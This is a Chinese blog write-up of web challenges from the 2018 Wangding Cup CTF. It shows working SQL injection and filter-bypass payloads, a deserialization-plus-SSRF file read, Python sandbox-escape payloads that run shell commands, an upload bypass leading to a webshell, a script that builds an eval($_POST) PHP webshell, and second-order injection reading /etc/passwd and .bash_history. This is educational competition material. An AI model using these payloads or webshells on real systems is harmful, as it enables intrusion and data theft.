<!DOCTYPE html>
<html lang="zh-cn">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          2018网鼎杯web部分write-up合集 - 信息安全个人wiki&amp;blog
        
    </title>

    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">

    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

<meta name="generator" content="Hexo 4.2.1"></head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>信息安全个人WIKI&amp;BLOG</span>
  </a>
</div>
    <div class="book-menu">
  <ul>
<li><a href="/">Home</a></li>
<li><a href="/about">About</a></li>
<li><a href="/note">Notes</a></li>
</ul>
<h1 id="web安全"><a href="#web安全" class="headerlink" title="web安全"></a><strong>web安全</strong></h1><h3 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h3><ul>
<li><a href="/contents/xss">WebSecurity-xss</a></li>
<li><a href="/contents/csrf">WebSecurity-csrf</a></li>
<li><a href="/contents/ssrf">WebSecurity-ssrf</a></li>
<li><a href="/contents/FI">WebSecurity-FI</a></li>
<li><a href="/contents/rce">WebSecurity-rce</a></li>
<li><a href="/contents/upload">WebSecurity-upload</a></li>
<li><a href="/contents/xxe">WebSecurity-xxe</a></li>
</ul>
<h2 id="labs"><a href="#labs" class="headerlink" title="labs"></a>labs</h2><ul>
<li><a href="/contents/xsslabs">xss-demo项目练习</a></li>
<li><a href="/contents/sqllabs">sql-labs项目练习</a></li>
<li><a href="/contents/uploadlabs">upload-labs系列write-up</a></li>
<li><a href="/contents/code-breaking">code-breaking write-up</a></li>
</ul>
<h2 id="CTF-amp-AWD"><a href="#CTF-amp-AWD" class="headerlink" title="CTF&amp;AWD"></a>CTF&amp;AWD</h2><ul>
<li><a href="/contents/awd">百越杯AWD攻防源码复现分析</a></li>
<li><a href="/contents/jarvis">Jarvis oj web部分write-up</a></li>
<li><a href="/contents/babyphp">hacklu_CTF2018 write up</a></li>
<li><a href="/contents/suctf">suctf招新赛web全题解</a></li>
<li><a href="/contents/shanghai">骇极杯CTF Write up</a></li>
<li><a href="/contents/wangding">2018网鼎杯web部分write-up合集</a></li>
</ul>
<h2 id="实战-amp-总结"><a href="#实战-amp-总结" class="headerlink" title="实战&amp;总结"></a>实战&amp;总结</h2><ul>
<li><a href="/contents/login">登录框渗透总结</a></li>
<li><a href="/contents/logic">登录逻辑漏洞总结</a></li>
<li><a href="/contents/unauthorized">未授权访问渗透总结</a></li>
<li><a href="/contents/mysql-fileread">mysql客户端读取漏洞</a></li>
</ul>
<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a><strong>内网渗透</strong></h1><ul>
<li>待补充</li>
</ul>
<h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a><strong>代码审计</strong></h1><h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><ul>
<li><a href="/contents/variable">代码审计基础之变量覆盖漏洞</a></li>
<li><a href="/contents/injection">代码审计基础之命令注入函数</a></li>
<li><a href="/contents/serialize">代码审计基础之php反序列化</a></li>
</ul>
<h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><ul>
<li>待补充</li>
</ul>
<h1 id="安全开发"><a href="#安全开发" class="headerlink" title="安全开发"></a><strong>安全开发</strong></h1><ul>
<li><a href="/contents/tools">一些工具的使用命令</a></li>
</ul>

</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
  <div class="sidebar-toggle-inner"></div>
</div>

<script>
function add_inner() {
  let inner = document.querySelector('.sidebar-toggle-inner')
  inner.classList.add('show')  
}

function remove_inner() {
  let inner = document.querySelector('.sidebar-toggle-inner')
  inner.classList.remove('show')
}

function sidebar_toggle() {
    let sidebar_toggle = document.querySelector('.sidebar-toggle')
    let sidebar = document.querySelector('.book-sidebar')
    let content = document.querySelector('.off-canvas-content')
    if (sidebar_toggle.classList.contains('extend')) { // show
        sidebar_toggle.classList.remove('extend')
        sidebar.classList.remove('hide')
        content.classList.remove('extend')
    }
    else { // hide
        sidebar_toggle.classList.add('extend')
        sidebar.classList.add('hide')
        content.classList.add('extend')
    }
}
</script>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  <p>为了响应国家安全号召，我参加了网鼎杯，然后我就被暴打了…<a id="more"></a> </p>
<p>发现这次的题目还挺好的</p>
<p>于是借了几个号把web部分整理一下</p>
<h2 id="第一场"><a href="#第一场" class="headerlink" title="第一场"></a>第一场</h2><h3 id="fakebook"><a href="#fakebook" class="headerlink" title="fakebook"></a>fakebook</h3><p>打开随意测试一番，发现一个注入点和<code>ssrf</code>的点</p>
<p>同时御剑还扫到<code>robots.txt login.php user.php index.php flag.php</code></p>
<p><code>robots.txt</code>打开得到<code>user.php.bak</code>下载下来是<code>ssrf</code>的点</p>
<p><img src="/img/wangding_1.png" alt=""></p>
<p><code>ssrf</code>的点不知道怎么利用，那就尝试注入吧</p>
<p>这里<code>union select</code>被过滤了我们用<code>/**/</code>绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">爆表：view.php?no&#x3D;-1 unIon&#x2F;**&#x2F;select 1,table_name,3,4 from information_schema.tables where  table_schema&#x3D;database()     得到users爆列：view.php?no&#x3D;-1 unIon&#x2F;**&#x2F;select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema&#x3D;database()# 得到no,username,passwd,data爆字段：view.php?no&#x3D;-1 unIon&#x2F;**&#x2F;select 1,data,3,4 from users#    得到data：O:8:&quot;UserInfo&quot;:3&#123;s:4:&quot;name&quot;;s:4:&quot;test&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:13:&quot;www.baidu.com&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/img/wangding_2.png" alt=""></p>
<p>这里我们看到了反序列化 因此猜到利用反序列化构造<code>blog</code>部分再结合<code>ssrf</code>漏洞即可读取任意文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no&#x3D;-1&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:4:&quot;test&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;#</span><br></pre></td></tr></table></figure>

<p>页面源代码查到一段<code>base64</code>的加密密文，解密后即为<code>flag.php</code>的内容 这里我们还读了一下其他文件</p>
<p>注入过滤部分</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ($db-&gt;anti_sqli($no))&#123;    die(&quot;no hack ~_~&quot;);&#125;dp.php里的函数public function anti_sqli ($no)&#123;$patterns &#x3D; &quot;&#x2F;union\Wselect|0x|hex&#x2F;i&quot;;return preg_match($patterns,$no);&#125;</span><br></pre></td></tr></table></figure>

<p><code>ssrf</code>部分</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user.php&lt;?phpclass UserInfo&#123;    public $name &#x3D; &quot;&quot;;    public $age &#x3D; 0;    public $blog &#x3D; &quot;&quot;;    public function __construct($name, $age, $blog)    &#123;        $this-&gt;name &#x3D; $name;        $this-&gt;age &#x3D; (int)$age;        $this-&gt;blog &#x3D; $blog;    &#125;    function get($url)    &#123;        $ch &#x3D; curl_init();        curl_setopt($ch, CURLOPT_URL, $url);        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);        $output &#x3D; curl_exec($ch);        $httpCode &#x3D; curl_getinfo($ch, CURLINFO_HTTP_CODE);        if($httpCode &#x3D;&#x3D; 404) &#123;            return 404;        &#125;        curl_close($ch);        return $output;    &#125;    public function getBlogContents ()    &#123;        return $this-&gt;get($this-&gt;blog);    &#125;    public function isValidBlog ()    &#123;        $blog &#x3D; $this-&gt;blog;        return preg_match(&quot;&#x2F;^(((http(s?))\:\&#x2F;\&#x2F;)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\&#x2F;\S*)?$&#x2F;i&quot;, $blog);    &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>反序列化部分</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$res &#x3D; $db-&gt;getUserByNo($no);$user &#x3D; unserialize($res[&#39;data&#39;]);</span><br></pre></td></tr></table></figure>

<p><code>base64</code>部分</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ($response &#x3D;&#x3D;&#x3D; 404)&#123;echo &quot;404 Not found&quot;;&#125;else&#123;$base64 &#x3D; base64_encode($response);echo &quot;&lt;iframe width&#x3D;&#39;100%&#39; height&#x3D;&#39;10em&#39; src&#x3D;&#39;data:text&#x2F;html;base64,&#123;$base64&#125;&#39;&gt;&quot;;&#x2F;&#x2F; echo $response;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="spider"><a href="#spider" class="headerlink" title="spider"></a>spider</h3><p>太深奥了没弄懂qaq</p>
<p><a href="https://blog.csdn.net/xiangshangbashaonian/article/details/81870097" target="_blank" rel="noopener">参考官方WP</a></p>
<h2 id="第二场"><a href="#第二场" class="headerlink" title="第二场"></a>第二场</h2><h3 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h3><p><img src="/img/wangding_3.png" alt=""></p>
<p>正则方面</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[\*+-&#x2F;]</span><br></pre></td></tr></table></figure>

<p>实际上短杆 <strong>-</strong> 在方括号中有特殊的含义，表示范围。 <code>[\*+-/]</code> 这个正则实际上包含了以下字符：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+ , - . &#x2F;</span><br></pre></td></tr></table></figure>

<p>正则表达式末尾的加号 <strong>+</strong> 并不严谨，严谨的写法应该在加号后面添加一个 <strong>$</strong> 符号，表示输入的字符串以数字结尾，变成这样 <code>**^[0-9.]+\s\*[*+-/]\s*[0-9.]+$**</code></p>
<p>因此可用逗号绕过，百度了一下<code>python</code>沙箱逃逸</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;读文件().__class__.__bases__[0].__subclasses__()[40](r&#39;C:\1.php&#39;).read()&#x2F;&#x2F;写文件().__class__.__bases__[0].__subclasses__()[40](&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;input&#39;, &#39;w&#39;).write(&#39;123&#39;)&#x2F;&#x2F;执行任意命令().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;ls  &#x2F;var&#x2F;www&#x2F;html&quot;).read()&#39; )</span><br></pre></td></tr></table></figure>

<p>因此构造payload读到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1+1,().__class__.__bases__[0].__subclasses__()[40](r&#39;&#x2F;flag&#39;).read()</span><br></pre></td></tr></table></figure>

<p><img src="/img/wangding_4.png" alt=""></p>
<h3 id="Wafupload"><a href="#Wafupload" class="headerlink" title="Wafupload"></a>Wafupload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php$sandbox &#x3D; &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;&#39; . md5(&quot;phpIsBest&quot; . $_SERVER[&#39;REMOTE_ADDR&#39;]);@mkdir($sandbox);@chdir($sandbox);if (!empty($_FILES[&#39;file&#39;])) &#123;    #mime check    if (!in_array($_FILES[&#39;file&#39;][&#39;type&#39;], [&#39;image&#x2F;jpeg&#39;, &#39;image&#x2F;png&#39;, &#39;image&#x2F;gif&#39;])) &#123;        die(&#39;This type is not allowed!&#39;);    &#125;    #check filename    $file &#x3D; empty($_POST[&#39;filename&#39;]) ? $_FILES[&#39;file&#39;][&#39;name&#39;] : $_POST[&#39;filename&#39;];    if (!is_array($file)) &#123;        $file &#x3D; explode(&#39;.&#39;, strtolower($file));    &#125;    $ext &#x3D; end($file);    if (!in_array($ext, [&#39;jpg&#39;, &#39;png&#39;, &#39;gif&#39;])) &#123;        die(&#39;This file is not allowed!&#39;);    &#125;    $filename &#x3D; reset($file) . &#39;.&#39; . $file[count($file) - 1];    if (move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], $sandbox . &#39;&#x2F;&#39; . $filename)) &#123;        echo &#39;Success!&#39;;        echo &#39;filepath:&#39; . $sandbox . &#39;&#x2F;&#39; . $filename;    &#125; else &#123;        echo &#39;Failed!&#39;;    &#125;&#125;show_source(__file__);?&gt;</span><br></pre></td></tr></table></figure>

<p>分析代码可知，<strong>第8-10行</strong> 进行了 <strong>MIME</strong> 类型检测， <strong>第12-20行</strong> 对文件后缀进行了检测，后缀名取的 <strong>$file</strong> 数组最后一个元素</p>
<p>然后在生成文件的时候，文件路径又用 <strong>$file</strong> 数组第一个元素做文件名，数组最后一个下标对应的值作为后缀，这明显存在不一致可绕过的问题</p>
<p><a href="https://blog.csdn.net/publicstr/article/details/82085883" target="_blank" rel="noopener">详解</a></p>
<p><img src="/img/wangding_5.png" alt=""></p>
<p>菜刀连上<code>webshell</code>在根目录找到<code>flag</code></p>
<h3 id="unfinished-sqlweb"><a href="#unfinished-sqlweb" class="headerlink" title="unfinished sqlweb"></a>unfinished sqlweb</h3><p>这两道涉及的注入知识还不太清楚 以后更</p>
<p><a href="https://xz.aliyun.com/t/2619#toc-3" target="_blank" rel="noopener">参考链接</a></p>
<p><a href="https://www.colabug.com/4212788.html" target="_blank" rel="noopener">参考链接</a></p>
<h2 id="第三场"><a href="#第三场" class="headerlink" title="第三场"></a>第三场</h2><p>号没借到，嘤嘤嘤</p>
<h2 id="第四场"><a href="#第四场" class="headerlink" title="第四场"></a>第四场</h2><h3 id="blog"><a href="#blog" class="headerlink" title="blog"></a>blog</h3><p><a href="https://comicalt.github.io/2018/09/01/wangding/7.png" target="_blank" rel="noopener"><img src="https://comicalt.github.io/2018/09/01/wangding/7.png" alt="img"></a></p>
<p>去github搜青龙鼎科技搜到一个接口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WD_UserListAPI.php?uid&#x3D;1</span><br></pre></td></tr></table></figure>

<p>用<code>bp</code>爆破<code>uid</code>的值<code>233</code>则是<code>flag</code>在的<code>payload</code></p>
<p><img src="/img/wangding_6.png" alt=""></p>
<h3 id="NoWafUpload"><a href="#NoWafUpload" class="headerlink" title="NoWafUpload"></a>NoWafUpload</h3><p>扫描器扫到<code>www.zip</code></p>
<p>下载得到一个<code>so</code>文件一个<code>php</code>文件，上传这个<code>php</code>文件得到<code>phpinfo</code>，猜想是<code>so</code>文件进行了加密的过程</p>
<p>看<code>wp</code>发现首先是一个<code>zlib</code> 的压缩，<code>MD5</code>验证 。最后使用了异或<code>0xc</code></p>
<p>贴大佬脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import hashlibimport zlibdef md5(s):    hash &#x3D; hashlib.md5()    hash.update(s)    return hash.hexdigest()shell &#x3D; &quot;&lt;?php eval($_POST[&#39;line&#39;]);?&gt;&quot;ret &#x3D; &quot;&quot;for i in zlib.compress(shell):    ret +&#x3D; chr(ord(i) ^ 0xC)s_len &#x3D; chr(0x2)s &#x3D; md5(ret) + s_len + &quot;\x00&quot; * 4 + s_len + &quot;\x00&quot; * 4 + retf &#x3D; open(&quot;line.php&quot;, &quot;wb&quot;)  f.write(s)f.close()</span><br></pre></td></tr></table></figure>

<p>文件生成了但是上传上去总404..不知道为啥</p>
<h3 id="comment"><a href="#comment" class="headerlink" title="comment"></a>comment</h3><p>登录页面用bp爆破得到账号密码 <code>zhangwei zhangwei666</code></p>
<p>同时发现git泄露 但是普通的git得到的源码是不完整的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GitHack.py http:&#x2F;&#x2F;741c8ceacb184a8b9caef0edc303d0f9219780aa34c0462c.game.ichunqiu.com&#x2F;.git</span><br></pre></td></tr></table></figure>

<p>这里我们需要用到一个工具<code>gittools</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Dumper&#x2F;gitdumper.sh http:&#x2F;&#x2F;xxx.xxx&#x2F;.git&#x2F; tempExtractor&#x2F;extractor.sh temp temp2cd temp2tree</span><br></pre></td></tr></table></figure>

<p>这样得到了三个源码其中有一个是完整的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phpinclude &quot;mysql.php&quot;;session_start();if($_SESSION[&#39;login&#39;] !&#x3D; &#39;yes&#39;)&#123;    header(&quot;Location: .&#x2F;login.php&quot;);    die();&#125;if(isset($_GET[&#39;do&#39;]))&#123;switch ($_GET[&#39;do&#39;])&#123;case &#39;write&#39;:    $category &#x3D; addslashes($_POST[&#39;category&#39;]);    $title &#x3D; addslashes($_POST[&#39;title&#39;]);    $content &#x3D; addslashes($_POST[&#39;content&#39;]);    $sql &#x3D; &quot;insert into board            set category &#x3D; &#39;$category&#39;,                title &#x3D; &#39;$title&#39;,                content &#x3D; &#39;$content&#39;&quot;;    $result &#x3D; mysql_query($sql);    header(&quot;Location: .&#x2F;index.php&quot;);    break;case &#39;comment&#39;:    $bo_id &#x3D; addslashes($_POST[&#39;bo_id&#39;]);    $sql &#x3D; &quot;select category from board where id&#x3D;&#39;$bo_id&#39;&quot;;    $result &#x3D; mysql_query($sql);    $num &#x3D; mysql_num_rows($result);    if($num&gt;0)&#123;    $category &#x3D; mysql_fetch_array($result)[&#39;category&#39;];    $content &#x3D; addslashes($_POST[&#39;content&#39;]);    $sql &#x3D; &quot;insert into comment            set category &#x3D; &#39;$category&#39;,                content &#x3D; &#39;$content&#39;,                bo_id &#x3D; &#39;$bo_id&#39;&quot;;    $result &#x3D; mysql_query($sql);    &#125;    header(&quot;Location: .&#x2F;comment.php?id&#x3D;$bo_id&quot;);    break;default:    header(&quot;Location: .&#x2F;index.php&quot;);&#125;&#125;else&#123;    header(&quot;Location: .&#x2F;index.php&quot;);&#125;?&gt;</span><br></pre></td></tr></table></figure>

<p>观察源码可以发现有<code>board、comment</code>两张表，首先写评论的时候数据写到<code>board</code> 然后再次评论的时候 <code>category</code>这个变量会从 <code>board</code> 表中读取然后构成二次注入</p>
<p>也就是说<code>comment</code> 中的<code>category</code> 字段是直接取 <code>board</code>字段。</p>
<p>构造成二次注入。</p>
<p>比如说在<code>board</code> 表中写入一段</p>
<p>如下：</p>
<p><code>&#39;, content=(select user()),/*</code> 然后 评论的时候 只需要闭合这个就OK</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;, content&#x3D;(select user()),&#x2F;**&#x2F;#&#96; 就可以查询到当前的&#96;user</span><br></pre></td></tr></table></figure>

<p>然后进行测试吧</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;, content&#x3D;(select user()),&#x2F;*</span><br></pre></td></tr></table></figure>

<p><img src="/img/wangding_8.png" alt=""></p>
<p>然后在评论处评论<code>*/#</code>得到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">正文test留言root@localhost</span><br></pre></td></tr></table></figure>

<p>接着我们查下pass</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;,content&#x3D;(select load_file(&#39;&#x2F;&#x2F;etc&#x2F;passwd&#39;)),&#x2F;*</span><br></pre></td></tr></table></figure>

<p><img src="/img/wangding_9.png" alt=""></p>
<p>发现一个<code>www</code>用户</p>
<p>查下用户的命令记录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;,content&#x3D;(select load_file(&#39;&#x2F;&#x2F;home&#x2F;www&#x2F;.bash_history&#39;)),&#x2F;*</span><br></pre></td></tr></table></figure>

<p>得到这个<code>cd /tmp/ unzip html.zip rm -f html.zip cp -r html /var/www/ cd /var/www/html/ rm -f .DS_Store service apache2 start</code></p>
<p><code>.DS_Store</code>是什么？</p>
<p>查一下这个文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;,content&#x3D;(select hex(load_file(&#39;&#x2F;&#x2F;tmp&#x2F;html&#x2F;.DS_Store&#39;))),&#x2F;*</span><br></pre></td></tr></table></figure>

<p>得到一串hex值 丢到winhex</p>
<p><img src="/img/wangding_10.png" alt=""></p>
<p>用同样的方法查flag文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;,content&#x3D;(select hex(load_file(&#39;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag_8946e1ff1ee3e40f.php&#39;))),&#x2F;*</span><br></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $flag &#x3D; &#39;flag&#123;b586c86e-b6e4-49b4-a29b-7565a5ea7afc&#125;&#39;; ?&gt;</span><br></pre></td></tr></table></figure>
</div>


  <div class="book-comments">
    




  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image -->
    <div class="author-img">
      
        <figure class="avatar avatar-lg">
          <img src="/avater.jpg" alt="...">
        </figure>
      
    </div>

    <!-- Author title -->
    <div class="author-title">
      <div>comical</div>
      <div>2018-09-21</div>
    </div>
  </div>

  
    <div class="divider"></div>

    <div class="link">
      <a class="category-link" href="/categories/ctf-awd/">ctf+awd</a>

      <a class="tag-link" href="/tags/ctf/" rel="tag">#ctf</a>
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

</body>
</html>


<script src="/js/book.js"></script>
